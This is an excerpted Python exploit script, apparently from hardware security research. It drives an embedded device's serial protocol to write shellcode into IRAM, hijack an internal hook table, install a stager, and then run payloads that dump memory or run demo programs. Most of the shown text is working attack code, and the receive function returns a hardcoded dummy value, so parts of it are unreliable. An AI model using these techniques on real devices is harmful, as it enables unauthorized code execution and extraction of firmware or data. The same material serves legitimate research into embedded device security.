...
from pwn import remote,context,log,xor,raw_input
...
def send_packet(r, msg, step=2, sleep_amt=0.01, is_str=False):
    """
    ...
    # print(f'Original msg: {msg}, len: {len(msg)}')
    # print ("adding length")
    # print(f'Length: {len(msg)+1}')
    if not is_str:
        # msg is bytes, convert to string for processing
        msg_str = msg.decode('latin-1') if isinstance(msg, bytes) else msg
        msg = chr(len(msg_str)+1) + msg_str
    else:
        msg = chr(len(msg)+1) + chr(int(msg))
    # print(f'Msg after adding length: {msg}, len: {len(msg)}')

    # Then add the checksum to the packet
    checksum_byte = calc_checksum_byte(msg)
    # print(f"adding checksum: {checksum_byte}, hex: {hex(checksum_byte)}, char: {chr(checksum_byte)}")
    msg = msg + chr(checksum_byte)
    # print(f'Msg after adding checksum: {msg}, len: {len(msg)}')
    # print(f'Msg hex representation: {msg.encode("latin-1").hex()}')
    # print(f'Raw bytes: {bytes(msg, "latin-1")}')
    r.send(msg)
...
def recv_packet(r):
    ...
    # else:
    #     return answ[1:-1]
    return bytes("1 1 1 1 1 1 1 1".encode("utf-8"))
...
def encode_packet_for_stager(chunk):
    ...
    for i in range(1, 256):
        # Check if byte i is not in chunk and i is not the length+2
...
def invoke_primary_handler(r, handler_ind, args="", await_response=True):
    ...
    print(f"Invoking primary handler with index: {handler_ind}, args: {args}")
    payload = bytes([handler_ind])
    if isinstance(args, str):
        args = args.encode('latin-1')
    send_packet(r, payload + args, is_str=False)
    if await_response:
...
def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
    ...
    if isinstance(add_args, str):
        add_args = add_args.encode('latin-1')
    packet = b"".join([
        bytes([0x84]),
        b"\x5a\x2e",
        struct.pack(">I", arg_dw),
        add_args
    ])
    send_packet(r, packet, step, sleep_amt, is_str=False)
    return recv_packet(r)
...
def _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no):
    ...
    r.write_debug("## Exploit Write to IRAM ##")
    exploit_write_to_iram(r, tar_addr, shellcode)
    r.write_debug("## Exploit Write to IRAM Done ##")
    r.write_debug("## Exploit Write to Add Hook Table ##")
    exploit_write_to_iram(r, ADD_HOOK_TABLE_START+8 *
                          add_hook_no+2, b"\x00\xff"+struct.pack(">I", tar_addr))
    r.write_debug("## Exploit Write to Add Hook Table Done ##")
...
def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    r.write_debug("## Write via Stager ##")
    invoke_add_hook(r, stager_add_hook_ind,
                       struct.pack(">I", tar_addr), False)
    r.write_debug("## Write via Stager Done ##")
    r.write_debug("## Send full message via Stager ##")
    send_full_msg_via_stager(r, contents, 8, 0.01)
    r.write_debug("## Send full message via Stager Done ##")
...
def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
    ...
    r.write_debug("## Install Addhook via Stager ##")
    ...
    print(struct.pack(">I", ADD_HOOK_TABLE_START+8*add_hook_no))
    r.write_debug("## Install Addhook via Stager Done ##")
    r.write_debug("## Install payload via Stager ##")
    # Write the code of the handler itself
    write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)
    r.write_debug("## Install payload via Stager Done ##")
...
def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
    ...
    answ = invoke_add_hook(
        r, addhook_ind, b"A"+struct.pack(">II", tar_addr, num_bytes))
...
def handle_conn(r, action, args):
    ...
    for i in range(1):
        r.write_debug("## Get Version ##")
        version = get_version(r)
        r.write_debug("## Get Version Done ##")
    ...
    if payload is not None:
        r.write_debug("## Install Invoke Hook Addhook ##")
        print("Installing the additional hook ########")
        start = time.time()
        ...
        r.write_debug("## Install Addhook Done ##")
    
    if action == ACTION_INVOKE_HOOK:
        r.write_debug("## Invoke Invoke Hook Addhook ##")
        answ = invoke_add_hook(r, second_addhook_ind, args.args)
        print("Got answer: {}".format(answ))
        r.write_debug("## Invoke Addhook Done ##")
        ...
        r.write_debug("## Dump Done ##")

    elif action == ACTION_TEST:
        r.write_debug("## Invoke Test Addhook ##")
        answ = invoke_add_hook(r, second_addhook_ind)
        print("Got answer: {}".format(answ))
        r.write_debug("## Invoke Addhook Done ##")

    elif action == ACTION_HELLO_LOOP:
        r.write_debug("## Invoke Hello Loop Addhook ##")
        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
        print("Got answer: {}".format(answ))
        r.write_debug("## Invoke Addhook Done ##")

    elif action == ACTION_TIC_TAC_TOE:
        r.write_debug("## Invoke Tic Tac Toe Addhook ##")
...
def main():
    ...
    parser.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
                        help="local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH")
    ...
    parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
                        help='The file containing the payload to be executed')
    ...
    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at")
    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump")
